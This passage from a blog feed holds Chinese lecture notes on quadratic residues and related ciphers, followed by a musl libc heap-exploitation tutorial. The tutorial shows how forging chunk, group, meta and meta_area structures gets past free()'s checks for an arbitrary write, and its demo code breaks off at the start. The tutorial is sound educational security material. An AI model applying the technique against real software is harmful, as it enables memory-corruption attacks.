      <url>/2023/02/28/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80-Chapter-4%E2%80%94%E2%80%94%E4%BA%8C%E6%AC%A1%E5%89%A9%E4%BD%99%E4%B8%8E%E6%96%B9%E6%A0%B9/</url>
      
        <content type="html"><![CDATA[<p><font color=blue>定义4.1</font> 设m为正整数，若同余式$x^2\equiv a(\mod m),(a,m)&#x3D;1$，有解，则a称为模m的二次剩余，否则称为模m的二次非剩余</p><p><font color=blue>定义4.2</font> 勒让德符号：$(\frac{a}{p})$，当a为模p的二次剩余时，值为1；非2次剩余时值为-1，若$p|a$则值为0</p><p><font color=red>定理4.1</font> p为素数，若$a\equiv b(\mod p)$，则$(\frac{a}{p})&#x3D;(\frac{b}{p})$<br>求同余式$x^2\equiv a(\mod p)$的解可以看成是在有限域$\mathbb Z_p$中求多项式$x^2-a$的根。</p><p><font color=red>定理4.2</font> 欧拉判别法则：p为奇素数，则对于任意整数a，$(\frac{a}{p})\equiv a^{\frac{p-1}{2}}(\mod p)$<br>证明：<br>设$g$是$\mathbb Z_p$的本原元，则$\mathbb Z_p^*&#x3D;{g^0,g^1,…,g^{p-2}}$<br>对于所有$0\le i\le \frac{p-1}{2}$，$(g^{2i})^{\frac{p-1}{2}}&#x3D;(g^{p-1})^i&#x3D;1,(g^{2i+1})^{\frac{p-1}{2}}&#x3D;(g^{p-1})^ig^{\frac{p-1}{2}},g^{\frac{p-1}{2}}&#x3D;-1$（由g为本原元可知$g^{\frac{p-1}{2}}\ne 1$，但$(g^{\frac{p-1}{2}})^2&#x3D; 1$，故其只能为-1），故$(g^{\frac{p-1}{2}})^{2i+1}&#x3D;-1$<br>由于考虑模p的二次同余式，因此a可以看做是$\mathbb Z_p$中与之同余等价的元素<br>当$a\equiv g^{2i}(\mod p),0\le i&lt;\frac{p-1}{2}$，多项式$x^2-a&#x3D;x^2-g^{2i}$有根±g^i^，故$(\frac{a}{p})&#x3D;1\equiv a^{\frac{p-1}{2}}(\mod p)$<br>当$a\equiv g^{2i+1}(\mod p),0\le i&lt;\frac{p-1}{2}$，多项式$x^2-a&#x3D;x^2-g^{2i+1}$一定没有根。否则若$x_0^2&#x3D;g^{2i+1}$，那么$1&#x3D;(x_0^2)^{\frac{p-1}{2}}&#x3D;(g^{2i+1})^{\frac{p-1}{2}}&#x3D;-1$矛盾。故$(\frac{a}{p})&#x3D;-1\equiv a^{\frac{p-1}{2}}(\mod p)$</p><p><strong>由上述定理可知，模p的二次剩余有$\frac{p-1}{2}$个（本原元的所有偶数次幂）</strong></p><p><font color=green>推论</font> 设p为奇素数，则<br>$(\frac{1}{p})&#x3D;1$<br>$(\frac{-1}{p})&#x3D;(-1)^\frac{p-1}{2}$<br>$(\frac{ab}{p})&#x3D;(\frac{a}{p})(\frac{b}{p})$<br>$(\frac{a^n}{p})&#x3D;(\frac{a}{p})^n,n&gt;0$</p><p><font color=red>定理4.3</font> 设p为奇素数，则$(\frac{2}{p})&#x3D;(-1)^{\frac{p^2-1}{8}}$<br>证明：<strong>构造证明</strong><br>$(p-1)!\equiv 1\cdot 3\cdot 5\cdot … \cdot (p-2)\cdot 2\cdot 4\cdot … \cdot (p-1)$<br>对于4k+1型的p有<br>$\equiv 1\cdot (p-2)\cdot 3\cdot (p-4)\cdot 5\cdot …\cdot \frac{p-3}{2}\cdot (p-\frac{p-1}{2})\cdot 2^{\frac{p-1}{2}}\cdot (\frac{p-1}{2}!)(\mod p)$（后面一半所有偶数提个2出来，前半部分可以交替提一个-1）<br>$\equiv (-1)^{\frac{p-1}{4}}\cdot 2^{\frac{p-1}{2}}\cdot(\frac{p-1}{2}!)^2(\mod p)$<br>对于4k+3型的p有<br>$\equiv 1\cdot (p-2)\cdot 3\cdot (p-4)\cdot 5\cdot …\cdot(p-\frac{p-3}{2})\cdot\frac{p-1}{2}\cdot 2^{\frac{p-1}{2}}\cdot (\frac{p-1}{2}!)(\mod p)$<br>$\equiv (-1)^{\frac{p-3}{4}}\cdot 2^{\frac{p-1}{2}}\cdot(\frac{p-1}{2}!)^2(\mod p)$<br>Wilson定理知$(p-1)!\equiv -1(\mod p)$，及$(\frac{p-1}{2}!)^2\equiv(-1)^{\frac{p+1}{2}}(\mod p)$ <strong>（转化为$(-1)^{\frac{p-1}{2}}(p-1)!$）</strong> 可知当$p\equiv ±1(\mod 8)$时，$2^{\frac{p-1}{2}}\equiv 1(\mod p)$，当$p\equiv ±3(\mod 8)$时，$2^{\frac{p-1}{2}}\equiv -1(\mod p)$，综合验证得$2^{\frac{p-1}{2}}\equiv(-1)^{\frac{p^2-1}{8}}(\mod p)$，由欧拉判别法则$(\frac{2}{p})&#x3D;(-1)^{\frac{p^2-1}{8}}$</p><p><font color=red>定理4.4</font> 二次互反律：p，q是互素奇素数，则$(\frac{q}{p})&#x3D;(-1)^{\frac{p-1}{2}\frac{q-1}{2}}(\frac{p}{q})$<br>证明：太复杂了，不要求掌握</p><p><font color=blue>定义4.3</font> 雅可比符号：$m&#x3D;\prod_{i&#x3D;1}^np_i,p_i$是奇素数，对于任意整数a定义a模m的雅可比符号为$(\frac{a}{m})&#x3D;\prod_{i&#x3D;1}^n(\frac{a}{p_i})$，m为奇素数时，其雅克比符号就是勒让德符号。</p><p><font color=red>定理4.5</font> 设m为正奇数，$a\equiv b(\mod m)\Rightarrow (\frac{a}{m})&#x3D;(\frac{b}{m})$</p><p><font color=red>定理4.6</font> 设m为正奇数，则<br>(1) $(\frac{1}{m})&#x3D;1$<br>(2) $(\frac{ab}{ m})&#x3D;(\frac{a}{m})(\frac{b}{m})$<br>(3) $(\frac{a^n}{m})&#x3D;(\frac{a}{m})^n$<br>(4) $(\frac{-1}{m})&#x3D;(-1)^{\frac{m-1}{2}}$<br>(5) $(\frac{2}{m})&#x3D;(-1)^{\frac{m^2-1}{8}}$</p><p><font color=red>定理4.7</font> 设m,n为正奇数，则$(\frac{n}{m})&#x3D;(-1)^{\frac{m-1}{2}\frac{n-1}{2}}(\frac{m}{n})$</p><p><font color=blue>定义4.4</font> 二次剩余问题：未知n的分解式的情况下，一般性地判断一个整数a是否是模n的二次剩余是一个难解的问题，称为二次剩余问题。</p><p><font color=orange>加密算法1——Rabin加密算法</font><br>Alice选择两个4k+3型的素数（称为Blum素数）p,q，计算n&#x3D;pq，将p，q作为私钥公开n。<br>加密：明文为整数m，密文c&#x3D;m^2^(mod n)<br>解密：解同余方程c&#x3D;x^2^(mod n)可以得到4个解，选择其中有意义的解作为明文m。</p><p><font color=pink>计算方法——a&#x3D;x^2^(mod p)，p&#x3D;4k+3的解法</font><br>若上式有解，则在[0,p-1]中一定有解，因此数字不大时可以对a一直加p直到找到一个完全平方数即可（这种方法对p无4k+3的限制，但是p很大时不方便）<br>由$(\frac{a}{p})&#x3D;1$由欧拉判别法则$a^{\frac{p-1}{2}}\equiv 1(\mod p)$，故有$(a^{\frac{p-1}{4}})^2\equiv a(\mod p)$，故解为$x\equiv ±a^{\frac{p-1}{4}}(\mod p)$</p><p><font color=orange>加密算法2——Goldwasser-Micali加密算法</font><br>Alice选择两个不同的素数p，q，和整数y满足$(\frac{y}{p})&#x3D;(\frac{y}{q})&#x3D;-1$。计算n&#x3D;pq，p和q座位私钥公开n，y<br>加密：将二进制整数m作为明文，第i位记为b<del>i</del>，对于每一位，随机选择0&lt;x<del>i</del>&lt;n，若该位为0计算c<del>i</del>&#x3D;x<del>i</del>^2^(mod n)，否则计算c<del>i</del>&#x3D;yx<del>i</del>^2^(mod n)，密文为所有的c<br>解密：若c<del>i</del>为模n的二次剩余，则判断b<del>i</del>&#x3D;0，否则b<del>i</del>&#x3D;1</p><p><font color=blue>定义4.5</font> 设&lt;g&gt;是一个由元素g生成的一个n元循环群，则对于任意a∈&lt;g&gt;，存在0≤i&lt;n，a&#x3D;g^i^，称i为以g为底a的指标，记作ind<del>g</del>a。求指标的问题，在密码学中通常称为离散对数问题。n充分大的整数时求解离散对数问题为一个难解问题。</p><p><font color=red>定理4.8</font> 设&lt;g&gt;是一个n元循环群，a∈&lt;g&gt;，如果对于正整数m有：<br>(1) a^m^&#x3D;e<br>(2) 对于任意素因子p|m，$a^{\frac{m}{p}}\ne e$，则ord(a)&#x3D;m，且m|n</p><p><font color=blue>定义4.8</font> 原根：设m为正整数，整数a满足(a,m)&#x3D;1，a模m的阶ord<del>m</del>(a)是指a(mod m)在$\mathbb Z_m^*$中的阶；如果$\mathbb Z_m^*$为循环群，整数a称为模m的原根是指a(mod m)为$\mathbb Z_m^*$的生成元</p><p>根据上述定义，a所在模m剩余类中所有整数的模m阶均为ord<del>m</del>(a)</p><p>根据原根定义：当m&#x3D;2,4时，模m原根分别为1,3<br>一般地，当且仅当m&#x3D;2,4,p^a^,2p^a^（p为奇素数，a≥1），模m有原根</p><p><font color=red>定理4.9</font> 设&lt;g&gt;是一个n元循环群，a，b∈&lt;g&gt;，则ind<del>g</del>ab$\equiv$ind<del>g</del>a+ind<del>g</del>b(mod n)<br>证明：ind<del>g</del>a&#x3D;x，ind<del>g</del>b&#x3D;y，则g^x+y^&#x3D;ab&#x3D;$g^{ind_gab}$<br>即$g^{x+y-ind_gab}&#x3D;e$，又ord(g)&#x3D;n，故n|x+y-ind<del>g</del>ab，故结论成立</p><p><font color=blue>定义4.9</font> 设m是大于1的正整数，如果n次同余式x^n^&#x3D;a(mod m), (a,m)&#x3D;1有解，则a称作模m的n次剩余，否则为模m的n次非剩余。</p><p><font color=red>定理4.14</font> （高次剩余）设m为大于1的正整数，g为模m的一个原根，(a,m)&#x3D;1，d&#x3D;(n,$\varphi$(m))，那么x^n^&#x3D;a(mod m)有解的充要条件为$a^{\frac{\varphi(m)}{d}}\equiv 1(\mod m)$<br>证明：g为模m的一个原根，所以$\mathbb Z_m^*&#x3D;<g>,x^n\equiv a(\mod m)$有解的充要条件是$ind_gx^n&#x3D;ind_ga\Rightarrow nind_gx\equiv ind_ga(\mod \varphi(m))$<strong>（注意模m的循环群一共只有$\varphi(m)$个元素，因此要模$\varphi(m)$！）</strong>，令X&#x3D;ind<del>g</del>x，则有$nX\equiv ind_ga(\mod \varphi(m))$<br>该一次同余式有解的充要条件为(n,φ(m))|ind<del>g</del>a，即d|ind<del>g</del>a，等价于ind<del>g</del>a$\equiv$ 0(mod d)<br>由定理2.4(4)有$\frac{\varphi(m)}{d}ind_ga\equiv 0(\mod \varphi(m))$。两边取“指数”得$a^{\frac{\varphi(m)}{d}}\equiv 1(\mod m)$，故原命题成立。</p><p><strong>注</strong>：该定理还能帮助求解高次同余式的解数。对于同余式$ax\equiv b(\mod m)$，其有解的充要条件为$(a,m)|b$，且通解可以写成$x&#x3D;x_0+\frac{m}{(a,m)}t,t&#x3D;0,1,…,(a,m)-1$的形式，因此解的数量为$(a,m)$。那么$nX\equiv ind_ga(\mod \varphi(m))$的解数应该有$(n,\varphi(m))$个</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>musl pwn 入门 (2)</title>
      <link href="/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/"/>
      <url>/2023/02/28/musl-pwn-%E5%85%A5%E9%97%A8-2/</url>
      
        <content type="html"><![CDATA[<p>在上一篇文章中我们学习了musl libc中内存分配的相关知识，了解了重要的数据结构及函数内容。本文将在此基础上进一步分析musl pwn的利用方式。</p><p>musl libc利用的核心思想是向free中传入一个假的chunk指针。由于free函数会通过该chunk进行回溯，获取到其所在的<code>group</code>和<code>meta</code>，因此除了构造假chunk外，还需要构造假<code>group</code>和假<code>meta</code>。如果在假<code>meta</code>中合理构造<code>prev</code>和<code>next</code>指针，在<code>nontrivial_free</code>中调用<code>dequeue</code>函数就可以实现这两个地址互相写。</p><p>但在整个流程中，我们需要绕过很多检查，以及进入正确的分支。</p><p>在<code>free</code>中会调用<code>nontrivial_free</code>，<code>free</code>中调用的<code>get_meta</code>函数中有一些检查项：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">(/src/<span class="built_in">malloc</span>/mallocng/meta.h, line <span class="number">129</span>)</span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> meta *<span class="title function_">get_meta</span><span class="params">(<span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *p)</span></span><br><span class="line">&#123;</span><br><span class="line">assert(!((<span class="type">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="type">int</span> offset = *(<span class="type">const</span> <span class="type">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="type">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">assert(!offset);</span><br><span class="line">offset = *(<span class="type">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="type">const</span> <span class="type">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;</span><br><span class="line">assert(meta-&gt;mem == base);</span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);</span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="type">void</span> *)((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);</span><br><span class="line">assert(area-&gt;check == ctx.secret);</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;</span><br><span class="line">assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> meta *)meta;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol><li>meta-&gt;mem &#x3D;&#x3D; base，即meta中保存的group指针要正确。</li><li>index &lt;&#x3D; meta-&gt;last_idx，即chunk的索引不能越界。</li><li>area-&gt;check &#x3D;&#x3D; ctx.secret，即meta所在的meta_area的校验值正确。</li><li>offset &gt;&#x3D; size_classes[meta-&gt;sizeclass]*index</li><li>offset &lt; size_classes[meta-&gt;sizeclass]*(index+1)，这两个检查offset和chunk大小是否对应。</li><li>assert(offset &lt;&#x3D; meta-&gt;maplen*4096UL&#x2F;UNIT - 1);，即检查offset是否越界。</li></ol><p>如果伪造的<code>meta</code>位于一个伪造的<code>meta_area</code>中，需要首先获取校验值<code>secret</code>并保存到<code>meta_area</code>开头，即这一页最开始的地方。</p><p>通过这个函数的检查之后，<code>nontrivial_free</code>的分支语句：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">nontrivial_free</span><span class="params">(<span class="keyword">struct</span> meta *g, <span class="type">int</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="type">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="type">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="comment">// might still be active if there were no allocations</span></span><br><span class="line"><span class="comment">// after last available slot was taken.</span></span><br><span class="line"><span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (<span class="keyword">struct</span> mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里要求<code>mask+self == (2u&lt;&lt;g-&gt;last_idx)-1 &amp;&amp; okay_to_free(g)</code>，因此要合理设置<code>meta</code>的两个<code>mask</code>的值。</p><p>之后调用了<code>free_group</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> mapinfo <span class="title function_">free_group</span><span class="params">(<span class="keyword">struct</span> meta *g)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="type">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">if</span> (sc &lt; <span class="number">48</span>) &#123;</span><br><span class="line">ctx.usage_by_class[sc] -= g-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (g-&gt;maplen) &#123;</span><br><span class="line">step_seq();</span><br><span class="line">record_seq(sc);</span><br><span class="line">mi.base = g-&gt;mem;</span><br><span class="line">mi.len = g-&gt;maplen*<span class="number">4096UL</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="type">void</span> *p = g-&gt;mem;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> get_meta(p);</span><br><span class="line"><span class="type">int</span> idx = get_slot_index(p);</span><br><span class="line">g-&gt;mem-&gt;meta = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// not checking size/reserved here; it&#x27;s intentionally invalid</span></span><br><span class="line">mi = nontrivial_free(m, idx);</span><br><span class="line">&#125;</span><br><span class="line">free_meta(g);</span><br><span class="line"><span class="keyword">return</span> mi;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们不能在if-else语句中跳转到else分支，那样会再一次调用<code>nontrivial_free</code>，因此要保证<code>meta</code>的<code>maplen</code>字段不为0。</p><p>这些检查与条件判断通过后，就可以成功释放假chunk了。</p><p>下面就是musl libc unlink漏洞的demo程序，如有任何非预期情况请与笔者联系，不胜感激。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span 